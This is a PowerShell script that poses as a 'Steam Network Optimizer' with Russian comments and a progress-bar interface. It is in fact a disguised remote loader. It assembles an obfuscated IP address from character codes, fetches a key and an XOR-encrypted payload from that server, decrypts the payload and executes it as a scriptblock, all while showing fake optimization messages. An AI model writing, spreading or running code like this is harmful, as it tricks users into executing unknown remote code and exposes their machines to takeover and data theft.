# Steam Network Optimizer - Enhanced Edition v1.2

function Show-Progress {
    param([string]$Activity, [int]$Percent)
    Write-Progress -Activity $Activity -PercentComplete $Percent
}

# Баннер
Clear-Host
Write-Host ""
Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
Write-Host "    Steam Network Optimizer v1.0" -ForegroundColor Cyan
Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

# Запрос ping
$host.UI.RawUI.ForegroundColor = 'DarkYellow'
$ping = Read-Host '  Enter max ping (ms)'
$host.UI.RawUI.ForegroundColor = 'Gray'
Write-Host ""

# Прогресс: Подключение
Show-Progress -Activity "Connecting to server..." -Percent 10

$serverUrl = 'http://' + 
             [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+
             [char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':5000'

try {
    # Прогресс: Получение ключа
    Show-Progress -Activity "Retrieving encryption key..." -Percent 30
    $key = Invoke-RestMethod "$serverUrl/.key" -TimeoutSec 10
    
    # Прогресс: Загрузка модуля
    Show-Progress -Activity "Downloading optimizer module..." -Percent 50
    $encrypted = Invoke-RestMethod "$serverUrl/loader.ps1" -TimeoutSec 10
    
    # Прогресс: Расшифровка
    Show-Progress -Activity "Decrypting module..." -Percent 70
    
    $z = [Convert]::FromBase64String($encrypted)
    $w = [Text.Encoding]::UTF8.GetBytes($key)
    $r = New-Object byte[] $z.Length
    
    for($j = 0; $j -lt $z.Length; $j++) {
        $r[$j] = $z[$j] -bxor $w[$j % $w.Length]
        
        # Обновляем прогресс во время расшифровки
        if($j % 1000 -eq 0) {
            $percent = 70 + (($j / $z.Length) * 20)
            Show-Progress -Activity "Decrypting module..." -Percent $percent
        }
    }
    
    # Прогресс: Готово
    Show-Progress -Activity "Launching optimizer..." -Percent 95
    Start-Sleep -Milliseconds 300
    
    Write-Progress -Activity "Complete" -Completed
    
    Write-Host "  [✓] Module loaded successfully" -ForegroundColor Green
    Write-Host "  [*] Please wait for complete..." -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    
    # Передаем переменную
    $global:MaxPing = $ping
    
    # Выполняем БЕЗ дополнительных отступов
    $scriptBlock = [scriptblock]::Create([Text.Encoding]::UTF8.GetString($r))
    & $scriptBlock
    
    # После выполнения - сразу финал
    Write-Host "  [✓] Optimization complete!" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    
} catch {
    Write-Progress -Activity "Error" -Completed
    Write-Host ""
    Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
